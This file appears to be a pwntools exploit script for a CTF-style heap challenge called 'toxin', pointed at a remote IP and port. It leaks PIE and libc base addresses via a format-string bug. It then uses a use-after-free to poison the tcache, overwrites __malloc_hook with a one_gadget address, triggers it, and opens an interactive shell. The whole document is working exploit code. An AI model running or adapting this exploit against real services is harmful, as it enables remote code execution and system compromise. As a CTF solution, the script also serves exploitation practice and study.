from pwn import *

context.binary = binary = ELF('./toxin', checksec=False)
libc = ELF('./lib/libc.so.6', checksec=False)

def malloc(idx, size, data):
	p.sendlineafter(b'> ', b'1')
	p.sendlineafter(b'Toxin chemical formula length: ', str(size).encode())
	p.sendlineafter(b'Toxin index: ', str(idx).encode())
	p.sendlineafter(b'Enter toxin formula: ', data)


def edit(idx, data):
	p.sendlineafter(b'> ', b'2')
	p.sendlineafter(b'Toxin index: ', str(idx).encode())
	p.sendlineafter(b'Enter toxin formula: ', data)

def free(idx):
	p.sendlineafter(b'> ', b'3')
	p.sendlineafter(b'Toxin index: ', str(idx).encode())

def fmt_leak(idx):
	p.sendlineafter(b'> ', b'4')
	p.sendlineafter(b'Enter search term: ', f'%{idx}$p'.encode())
	return int(p.recvuntil(b'n')[:-2].decode(), 16)


#p = process()
p = remote('83.136.253.171',43589)


binary.address = fmt_leak(9) - 0x1284
info(f'pie base: {hex(binary.address)}')

libc.address = fmt_leak(13) - 0x21b97
info(f'libc base: {hex(libc.address)}')

__malloc_hook = libc.symbols.__malloc_hook
one_gadget = libc.address + 0x10a38c

info(f'__malloc_hook(): {hex(__malloc_hook)}')

malloc(0, 20, b'A' * 8)
free(0)
edit(0, p64(__malloc_hook))

malloc(1, 20, b'A' * 8)
malloc(2, 20, p64(one_gadget))

p.sendlineafter(b'> ', b'4')
p.sendafter(b'Enter search term: ', b'%999$')

p.recvrepeat(1)

p.interactive()
